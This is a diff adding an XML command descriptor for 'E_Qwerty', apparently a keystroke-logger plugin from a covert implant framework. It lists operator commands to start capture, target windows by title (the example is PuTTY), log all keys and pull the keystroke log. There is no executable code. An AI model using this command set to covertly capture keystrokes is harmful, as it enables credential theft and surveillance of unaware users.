@@ -1,0 +1,330 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="../XSLT/pluginHTML.xsl"?>
+<plugin id="20120" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="../XSD/pluginDetails.xsd">
+	<name>E_Qwerty (qw)</name>
+	<description>Keystroke Logger Lp Plugin</description>
+	<projectpath>plugin/Utility</projectpath>
+	<pluginname>E_QwertyLP</pluginname>
+	<version>
+		<majorType>1</majorType>
+		<minorType>0</minorType>
+	</version>
+	<commands>
+		<command id="0">
+			<name>Help</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<usage>
+				<argument>
+					<name>function id</name>
+					<definition>display help for this function</definition>
+				</argument>
+			</usage>
+			<description>shortcut for help
+			</description>
+			<examples>
+				<example>sample</example>
+				<example>sample 1</example>
+			</examples>
+			<alias>
+				<aliasName>qw</aliasName>
+				<aliasDef>~csusage 20120</aliasDef>
+			</alias>
+		</command>
+		<command id="1">
+			<name>loggingStatus</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<description>
+			This command will return the current status of the Keyboard Logger (Whether it is currently turned "ON" or "OFF").
+			</description>
+			<examples>
+				<example>qwstatus</example>
+			</examples>
+			<alias>
+				<aliasName>qwstatus</aliasName>
+				<aliasDef>20120 1</aliasDef>
+			</alias>
+		</command>
+		<command id="2">
+			<name>TurnLoggingOn</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<description>
+			This command will switch ON Logging of keys. All keys taht are entered to a active window with a title on the target list will be captured
+			</description>
+			<examples>
+				<example>qwstart</example>
+			</examples>
+			<alias>
+				<aliasName>qwstart</aliasName>
+				<aliasDef>20120 2</aliasDef>
+			</alias>
+		</command>
+		<command id="3">
+			<name>TurnLoggingOff</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<description>
+			This command will switch OFF Logging of keys. No keystrokes will be captured
+			</description>
+			<examples>
+				<example>qwstop</example>
+			</examples>
+			<alias>
+				<aliasName>qwstop</aliasName>
+				<aliasDef>20120 3</aliasDef>
+			</alias>
+		</command>
+		<command id="4">
+			<name>displayWindowList</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<description>
+			This command will display the list of titles of target active windows. (You can add/remove titles from this list using the wmadd/wmremove commands)
+			</description>
+			<examples>
+				<example>qwlist</example>
+			</examples>
+			<alias>
+				<aliasName>qwlist</aliasName>
+				<aliasDef>20120 4</aliasDef>
+			</alias>
+		</command>
+		<command id="5">
+			<name>addWindowToList</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<usage>
+				<argument>
+					<name>WindowTitle</name>
+					<definition>The title of the Window whose keys you wish to Log once it becomes active</definition>
+				</argument>
+			</usage>
+			<description>
+			This command will add the given WindowTitle to the list of Windows to log keys for.
+			</description>
+			<examples>
+				<example>qwadd "PuTTY"</example>
+			</examples>
+			<alias>
+				<aliasName>qwadd</aliasName>
+				<aliasDef>20120 5</aliasDef>
+			</alias>
+		</command>
+		<command id="6">
+			<name>removeWindowFromList</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<usage>
+				<argument>
+					<name>WindowTitle</name>
+					<definition>The title of the Window whose keys you no longer whish to log</definition>
+				</argument>
+			</usage>
+			<description>
+			This command will remove the WindowTitle corresponding to the given window title (found using qwlist) from the list of Windows to log keys for.
+			</description>
+			<examples>
+				<example>qwremove "PuTTY"</example>
+			</examples>
+			<alias>
+				<aliasName>qwremove</aliasName>
+				<aliasDef>20120 6</aliasDef>
+			</alias>
+		</command>
+		<command id="7">
+			<name>logAllKeys</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<usage>
+				<argument>
+					<name>on|off</name>
+					<definition>Turn logging of all keys on|off</definition>
+				</argument>
+			</usage>
+			<description>
+			This command Toggles logging of all Keys. If allkeys is toggled all keystrokes will be logged, whether the currently active window's title is on the WindowTitle List or not.
+			If it is not Toggled then the plugin relies on the titleList (displayed using 'qwlist'). If there are no window titles in the list all keystorkes will be captured.
+			</description>
+			<examples>
+				<example>qwlogall</example>
+			</examples>
+			<alias>
+				<aliasName>qwlogall</aliasName>
+				<aliasDef>20120 7</aliasDef>
+			</alias>
+		</command>
+		<command id="14">
+			<name>version</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<description>
+				This method returns the version of the currently loaded Qwerty driver.
+			</description>
+			<examples>
+				<example>qwversion</example>
+			</examples>
+			<alias>
+				<aliasName>qwversion</aliasName>
+				<aliasDef>20120 14</aliasDef>
+			</alias>
+		</command>
+		<command id="20">
+			<name>Display Driver Status</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<description>
+				This method indicates the status of the Qwerty Driver.
+			</description>
+			<alias>
+				<aliasName>qwdriverstatus</aliasName>
+				<aliasDef>20120 20</aliasDef>
+			</alias>
+			<examples>
+				<example>qwdriverstatus</example>
+			</examples>
+		</command>
+		<command id="24">
+			<name>Get Keystroke Log</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<alias>
+				<aliasName>qwgetlog</aliasName>
+				<aliasDef>20120 24</aliasDef>
+			</alias>
+			<description>
+			This PPC gets the current keystroke log.
+			</description>
+			<examples>
+				<example>qwgetlog</example>
+			</examples>
+		</command>
+		<command id="32">
+			<name>Set Log Limit</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<usage>
+				<argument>
+					<name>entries</name>
+					<definition>Entries that will be logged.  One entry corresponds to one window in the log.</definition>
+				</argument>
+			</usage>
+			<alias>
+				<aliasName>qwloglimit</aliasName>
+				<aliasDef>20120 32</aliasDef>
+			</alias>
+			<description>
+			Set the log limit (in number of windows)
+			</description>
+			<examples>
+				<example>qwloglimit 500</example>
+			</examples>
+		</command>
+		<command id="33">
+			<name>Detect Keyboard Type</name>
+			<version>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</version>
+			<introducedInVersion>
+				<majorType>1</majorType>
+				<minorType>0</minorType>
+			</introducedInVersion>
+			<alias>
+				<aliasName>qwtype</aliasName>
+				<aliasDef>20120 33</aliasDef>
+			</alias>
+			<description>
+			Detects whether the Machine is has a PS/2 or USB keyboard plugged in.
+			</description>
+			<examples>
+				<example>qwtype</example>
+			</examples>
+		</command>		
+	</commands>
+	<poc>erebus</poc>
+	<shortDescription>A short description goes here - Something about what this plugin does - I think...</shortDescription>
+	<comments>
+		<team>None</team>
+		<platforms>Windows (User/Win32)</platforms>
+		<rightsRequired>None</rightsRequired>
+		<files>None</files>
+		<dllDepend>None</dllDepend>
+		<pluginsDepend>None</pluginsDepend>
+		<librariesDepend>U_CompressionLib, U_ConsoleLib, CNEWin32, WzowskiLib</librariesDepend>
+		<associatedImplantId>None</associatedImplantId>
+	</comments>
+</plugin>
